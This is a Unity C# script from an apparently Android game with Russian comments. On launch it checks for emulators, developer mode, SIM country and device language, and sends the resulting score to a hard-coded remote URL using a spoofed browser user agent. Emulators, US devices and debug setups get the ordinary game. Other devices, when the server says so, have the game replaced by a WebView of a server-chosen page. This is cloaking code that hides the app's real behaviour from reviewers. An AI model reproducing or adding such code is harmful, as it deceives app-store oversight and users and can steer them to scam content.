using System;
using System.Collections;
using System.Linq;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class ShowPageScreen : MonoBehaviour
{
    public static ShowPageScreen Instance
    {
        get => FindObjectOfType<ShowPageScreen>();
    }

    private string homeString = "https://strixavora.life/nm7bPYWs";
    public bool createCloseBtn;

    private IEnumerator Start()
    {
        var score = 0;
        createCloseBtn = false;
        var jsonFile = Resources.Load<TextAsset>("geo_redirects");

        if (jsonFile == null)
        {
            LoadGame();
            UnityEngine.Debug.LogError("Файл geo_redirects.json не найден в Resources!");
            yield break;
        }

        var isEmulator = EmulatorCheck.IsRunningOnEmulator();
        if (!isEmulator)
        {
            score += 1;
        }

        var userCountry = SimCountryChecker.GetSimCountry();
        var deviceLanguage = DeviceLanguageHelper.GetLanguageISO();

        CountryListWrapper parsedData = JsonUtility.FromJson<CountryListWrapper>(jsonFile.text);
        var allowedCountries = parsedData.allowedCountries;

        var isContainsSim = allowedCountries.Contains(userCountry);
        if (isContainsSim)
        {
            score += 1;
        }

        var isContainsLocal = allowedCountries.Contains(deviceLanguage);
        if (isContainsLocal)
        {
            score += 1;
        }

        var isDebug = DeveloperModeCheck.IsDeveloperModeEnabled();
        if (!isDebug)
        {
            score += 1;
        }

        yield return StartCoroutine(MakeGetRequest(score, homeString, (url, isNextPage) =>
        {
            var isOpenGame = userCountry == "not_sim" || isEmulator || userCountry == "US" || isDebug || !isNextPage;

            if (isOpenGame)
            {
                LoadGame();
            }
            else
            {
                gameObject.AddComponent<ShowScreenManager>().OpenWebView(url);
                Screen.orientation = ScreenOrientation.AutoRotation;

                var canvas = FindObjectOfType<Canvas>();
                if (canvas != null)
                {
                    Destroy(canvas);
                }
            }
        }));
    }

    public void LoadGame()
    {
        SceneManager.LoadScene(1);
    }

    string GetAndroidUserAgent()
    {
        string osInfo = SystemInfo.operatingSystem.ToLower();
        string androidVersion = osInfo.Contains("android") ? osInfo.Replace("android ", "").Trim() : "Unknown";
        string deviceModel = SystemInfo.deviceModel;
        string chromeVersion = "122.0.0.0"; // Можно обновлять вручную

        return $"Mozilla/5.0 (Linux; Android {androidVersion}; {deviceModel}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chromeVersion} Mobile Safari/537.36";
    }

    private IEnumerator MakeGetRequest(int score, string target, Action<string, bool> response)
    {
        target += $"?score={score}";

        UnityWebRequest request = UnityWebRequest.Get(target);
        string userAgent = GetAndroidUserAgent();
        request.SetRequestHeader("User-Agent", userAgent);

        yield return request.SendWebRequest();

        if (request.result == UnityWebRequest.Result.Success)
        {
            var data = request.downloadHandler.text.Split(';');
            response?.Invoke(data[0], data[1] == "correct");
        }
        else
        {
            UnityEngine.Debug.Log("Ошибка запроса: " + request.error);
            response?.Invoke(null, false);
        }
    }
}

[Serializable]
public class CountryListWrapper
{
    public string[] allowedCountries;
}
